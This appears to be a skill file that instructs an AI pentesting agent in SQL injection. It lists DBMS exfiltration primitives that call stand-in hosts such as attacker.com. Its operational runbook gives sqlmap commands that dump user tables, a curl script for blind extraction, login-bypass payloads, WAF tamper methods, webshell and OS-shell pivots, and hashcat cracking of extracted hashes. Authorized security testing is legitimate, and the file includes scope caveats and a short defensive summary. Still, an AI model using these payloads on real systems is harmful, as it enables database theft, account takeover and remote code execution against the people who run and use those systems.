---
name: sql-injection
description: SQL injection testing covering union, blind, error-based, and ORM bypass techniques
---

# SQL Injection

SQLi remains one of the most durable and impactful vulnerability classes. Modern exploitation focuses on parser differentials, ORM/query-builder edges, JSON/XML/CTE/JSONB surfaces, out-of-band exfiltration, and subtle blind channels. Treat every string concatenation into SQL as suspect.

## Attack Surface

**Databases**
- Classic relational: MySQL/MariaDB, PostgreSQL, MSSQL, Oracle
- Newer surfaces: JSON/JSONB operators, full-text/search, geospatial, window functions, CTEs, lateral joins

**Integration Paths**
- ORMs, query builders, stored procedures
- Search servers, reporting/exporters

**Input Locations**
- Path/query/body/header/cookie
- Mixed encodings (URL, JSON, XML, multipart)
- Identifier vs value: table/column names (require quoting/escaping) vs literals (quotes/CAST requirements)
- Query builders: `whereRaw`/`orderByRaw`, string templates in ORMs
- JSON coercion or array containment operators
- Batch/bulk endpoints and report generators that embed filters directly

## Detection Channels

**Error-Based**
- Provoke type/constraint/parser errors revealing stack/version/paths

**Boolean-Based**
- Pair requests differing only in predicate truth
- Diff status/body/length/ETag

**Time-Based**
- `SLEEP`/`pg_sleep`/`WAITFOR`
- Use subselect gating to avoid global latency noise

**Out-of-Band (OAST)**
- DNS/HTTP callbacks via DB-specific primitives

## DBMS Primitives

### MySQL

- Version/user/db: `@@version`, `database()`, `user()`, `current_user()`
- Error-based: `extractvalue()`/`updatexml()` (older), JSON functions for error shaping
- File IO: `LOAD_FILE()`, `SELECT ... INTO DUMPFILE/OUTFILE` (requires FILE privilege, secure_file_priv)
- OOB/DNS: `LOAD_FILE(CONCAT('\\\\',database(),'.attacker.com\\a'))`
- Time: `SLEEP(n)`, `BENCHMARK`
- JSON: `JSON_EXTRACT`/`JSON_SEARCH` with crafted paths; GIS funcs sometimes leak

### PostgreSQL

- Version/user/db: `version()`, `current_user`, `current_database()`
- Error-based: raise exception via unsupported casts or division by zero; `xpath()` errors in xml2
- OOB: `COPY (program ...)` or dblink/foreign data wrappers (when enabled); http extensions
- Time: `pg_sleep(n)`
- Files: `COPY table TO/FROM '/path'` (requires superuser), `lo_import`/`lo_export`
- JSON/JSONB: operators `->`, `->>`, `@>`, `?|` with lateral/CTE for blind extraction

### MSSQL

- Version/db/user: `@@version`, `db_name()`, `system_user`, `user_name()`
- OOB/DNS: `xp_dirtree`, `xp_fileexist`; HTTP via OLE automation (`sp_OACreate`) if enabled
- Exec: `xp_cmdshell` (often disabled), `OPENROWSET`/`OPENDATASOURCE`
- Time: `WAITFOR DELAY '0:0:5'`; heavy functions cause measurable delays
- Error-based: convert/parse, divide by zero, `FOR XML PATH` leaks

### Oracle

- Version/db/user: banner from `v$version`, `ora_database_name`, `user`
- OOB: `UTL_HTTP`/`DBMS_LDAP`/`UTL_INADDR`/`HTTPURITYPE` (permissions dependent)
- Time: `dbms_lock.sleep(n)`
- Error-based: `to_number`/`to_date` conversions, `XMLType`
- File: `UTL_FILE` with directory objects (privileged)

## Key Vulnerabilities

### UNION-Based Extraction

- Determine column count and types via `ORDER BY n` and `UNION SELECT null,...`
- Align types with `CAST`/`CONVERT`; coerce to text/json for rendering
- When UNION is filtered, switch to error-based or blind channels

### Blind Extraction

- Branch on single-bit predicates using `SUBSTRING`/`ASCII`, `LEFT`/`RIGHT`, or JSON/array operators
- Binary search on character space for fewer requests
- Encode outputs (hex/base64) to normalize
- Gate delays inside subqueries to reduce noise: `AND (SELECT CASE WHEN (predicate) THEN pg_sleep(0.5) ELSE 0 END)`

### Out-of-Band

- Prefer OAST to minimize noise and bypass strict response paths
- Embed data in DNS labels or HTTP query params
- MSSQL: `xp_dirtree \\\\<data>.attacker.tld\\a`
- Oracle: `UTL_HTTP.REQUEST('http://<data>.attacker')`
- MySQL: `LOAD_FILE` with UNC path

### Write Primitives

- Auth bypass: inject OR-based tautologies or subselects into login checks
- Privilege changes: update role/plan/feature flags when UPDATE is injectable
- File write: `INTO OUTFILE`/`DUMPFILE`, `COPY TO`, `xp_cmdshell` redirection
- Job/proc abuse: schedule tasks or create procedures/functions when permissions allow

### ORM and Query Builders

- Dangerous APIs: `whereRaw`/`orderByRaw`, string interpolation into LIKE/IN/ORDER clauses
- Injections via identifier quoting (table/column names) when user input is interpolated into identifiers
- JSON containment operators exposed by ORMs (e.g., `@>` in PostgreSQL) with raw fragments
- Parameter mismatch: partial parameterization where operators or lists remain unbound (`IN (...)`)

### Uncommon Contexts

- ORDER BY/GROUP BY/HAVING with `CASE WHEN` for boolean channels
- LIMIT/OFFSET: inject into OFFSET to produce measurable timing or page shape
- Full-text/search helpers: `MATCH AGAINST`, `to_tsvector`/`to_tsquery` with payload mixing
- XML/JSON functions: error generation via malformed documents/paths

## Bypass Techniques

**Whitespace/Spacing**
- `/**/`, `/**/!00000`, comments, newlines, tabs
- `0xe3 0x80 0x80` (ideographic space)

**Keyword Splitting**
- `UN/**/ION`, `U%4eION`, backticks/quotes, case folding

**Numeric Tricks**
- Scientific notation, signed/unsigned, hex (`0x61646d696e`)

**Encodings**
- Double URL encoding, mixed Unicode normalizations (NFKC/NFD)
- `char()`/`CONCAT_ws` to build tokens

**Clause Relocation**
- Subselects, derived tables, CTEs (`WITH`), lateral joins to hide payload shape

## Testing Methodology

1. **Identify query shape** - SELECT/INSERT/UPDATE/DELETE, presence of WHERE/ORDER/GROUP/LIMIT/OFFSET
2. **Determine input influence** - User input in identifiers vs values
3. **Confirm injection class** - Reflective errors, boolean diffs, timing, or out-of-band callbacks
4. **Choose quietest oracle** - Prefer error-based or boolean over noisy time-based
5. **Establish extraction channel** - UNION (if visible), error-based, boolean bit extraction, time-based, or OAST/DNS
6. **Pivot to metadata** - version, current user, database name
7. **Target high-value tables** - auth bypass, role changes, filesystem access if feasible

## Operational Runbook

Once SQLi is detected, this is the canonical sequence to extract evidence. **Do NOT iterate payloads manually in a browser** — orchestrate via shell so the agent loop logs every command.

### Step 1 — confirm + fingerprint with sqlmap (one call)

```bash
# GET — single param injectable, default risk/level
sqlmap -u '<TARGET_URL>?<PARAM>=<BENIGN>' -p <PARAM> --batch --output-dir=sqlmap_<TARGET>/

# POST — full body, --data is critical
sqlmap -u '<TARGET_URL>' --data '<BENIGN_POST_BODY>' -p <PARAM> --batch \
  --output-dir=sqlmap_<TARGET>/

# With session cookie / bearer
sqlmap -u '<TARGET_URL>?<PARAM>=<BENIGN>' -p <PARAM> --batch \
  --cookie '<COOKIE_HEADER>' -H 'Authorization: Bearer <TOKEN>' \
  --output-dir=sqlmap_<TARGET>/

# When standard probing returns 0 — bump risk/level + try WAF tamper scripts
sqlmap -u '<TARGET_URL>?<PARAM>=<BENIGN>' -p <PARAM> --batch \
  --risk 3 --level 5 \
  --tamper=space2comment,between,randomcase,charunicodeencode \
  --output-dir=sqlmap_<TARGET>/
```

Triage output: `sqlmap_<TARGET>/log` contains the confirmed payload + DBMS. That's evidence #1.

### Step 2 — enumerate (DB → tables → schema)

```bash
sqlmap -u '<TARGET_URL>?<PARAM>=<BENIGN>' -p <PARAM> --batch --dbs --output-dir=sqlmap_<TARGET>/
sqlmap -u '<TARGET_URL>?<PARAM>=<BENIGN>' -p <PARAM> --batch -D <DB> --tables --output-dir=sqlmap_<TARGET>/
sqlmap -u '<TARGET_URL>?<PARAM>=<BENIGN>' -p <PARAM> --batch -D <DB> -T <TABLE> --columns --output-dir=sqlmap_<TARGET>/
```

### Step 3 — extract sensitive rows

```bash
# Dump targeted table
sqlmap -u '<TARGET_URL>?<PARAM>=<BENIGN>' -p <PARAM> --batch \
  -D <DB> -T users --dump --threads 4 --output-dir=sqlmap_<TARGET>/

# Boolean-blind specifically — speed up with parallel threads
sqlmap -u '<TARGET_URL>?<PARAM>=<BENIGN>' -p <PARAM> --batch \
  --technique=B --threads 8 -D <DB> -T users --dump
```

**HARD RULE**: once `--dbs` returns, the next call MUST be `--tables` on the target DB. Don't keep re-confirming injection — that's noise.

### Step 4 — blind extraction by hand (when sqlmap is blocked)

When the target's WAF filters `UNION`, `SELECT`, etc. but boolean-blind still works:

```bash
# Confirm one-bit extraction
for i in 1 2 3 4 5; do
  curl -s "<TARGET>?<PARAM>=1' AND ASCII(SUBSTRING(version(),$i,1))>96-- -" \
    -w '%{size_download}\n' -o /dev/null
done

# Parallel char-by-char (bash + GNU parallel) — extract version[1..30]
extract_char() {
  local pos=$1
  for c in {32..126}; do
    response=$(curl -s "<TARGET>?<PARAM>=1' AND ASCII(SUBSTRING(version(),$pos,1))=$c-- -" -w '%{size_download}' -o /dev/null)
    [[ $response -eq $TRUE_LENGTH ]] && printf "\\$(printf '%03o' $c)" && return
  done
}
export -f extract_char
parallel -j 8 extract_char ::: {1..30}
```

### Step 5 — auth-bypass payload library (post-detection login flow)

When SQLi is on a `/login` endpoint, the boolean-blind detection isn't always enough — try these in order until one returns a session token / 2xx + JSON-success-shape:

```
' OR 1=1--                  # most common
admin' OR 1=1--             # bypass + username spec
' OR '1'='1' --
' OR 1=1#                   # MySQL comment
admin'#
') OR 1=1--                 # closes paren
admin') OR 1=1--
```

If any payload returns a `set-cookie: session=` header or `{"token":"..."}` body, that's **critical-severity auth-bypass evidence**. Document the baseline response (random invalid creds → 401) alongside the bypass response (payload → 2xx + token) for the report.

### Step 6 — pivot to RCE (DBMS + privilege gated)

| DBMS | Path | Command |
|---|---|---|
| MSSQL | `xp_cmdshell` (often disabled) | `sqlmap ... --os-shell` |
| MySQL | `INTO OUTFILE` + LFI | `sqlmap ... --os-shell` (writes webshell) |
| PostgreSQL | `COPY ... PROGRAM` (≥9.3) | `sqlmap ... --os-shell` |
| Oracle | `DBMS_SCHEDULER` jobs | manual; rarely needed in AppSec scope |

If sqlmap reports RCE feasibility but the engagement scope excludes it, STOP and document the capability — do not actually pop the shell unless `opsec_level: loud` AND scope explicitly authorizes RCE.

### Hash cracking (post-extraction)

```bash
# Identify hash type with hashid first
hashid <extracted_hash>

# Crack with hashcat (replace mode-id per hashid output)
hashcat -m 0 hashes.txt /usr/share/wordlists/rockyou.txt
hashcat -m 100 hashes.txt /usr/share/wordlists/rockyou.txt -r rules/best64.rule
```

Document cracked plaintexts as **evidence of impact** (e.g. "admin password recovered: `***`") without echoing the actual password into the finding — replace with `***` or last-2-chars + length.

## Validation

1. Show a reliable oracle (error/boolean/time/OAST) and prove control by toggling predicates
2. Extract verifiable metadata (version, current user, database name) using the established channel
3. Retrieve or modify a non-trivial target (table rows, role flag) within legal scope
4. Provide reproducible requests that differ only in the injected fragment
5. Where applicable, demonstrate defense-in-depth bypass (WAF on, still exploitable via variant)

## False Positives

- Generic errors unrelated to SQL parsing or constraints
- Static response sizes due to templating rather than predicate truth
- Artificial delays from network/CPU unrelated to injected function calls
- Parameterized queries with no string concatenation, verified by code review

## Impact

- Direct data exfiltration and privacy/regulatory exposure
- Authentication and authorization bypass via manipulated predicates
- Server-side file access or command execution (platform/privilege dependent)
- Persistent supply-chain impact via modified data, jobs, or procedures

## Pro Tips

1. Pick the quietest reliable oracle first; avoid noisy long sleeps
2. Normalize responses (length/ETag/digest) to reduce variance when diffing
3. Aim for metadata then jump directly to business-critical tables; minimize lateral noise
4. When UNION fails, switch to error- or blind-based bit extraction; prefer OAST when available
5. Treat ORMs as thin wrappers: raw fragments often slip through; audit `whereRaw`/`orderByRaw`
6. Use CTEs/derived tables to smuggle expressions when filters block SELECT directly
7. Exploit JSON/JSONB operators in Postgres and JSON functions in MySQL for side channels
8. Keep payloads portable; maintain DBMS-specific dictionaries for functions and types
9. Validate mitigations with negative tests and code review; parameterize operators/lists correctly
10. Document exact query shapes; defenses must match how the query is constructed, not assumptions

## Summary

Modern SQLi succeeds where authorization and query construction drift from assumptions. Bind parameters everywhere, avoid dynamic identifiers, and validate at the exact boundary where user input meets SQL.
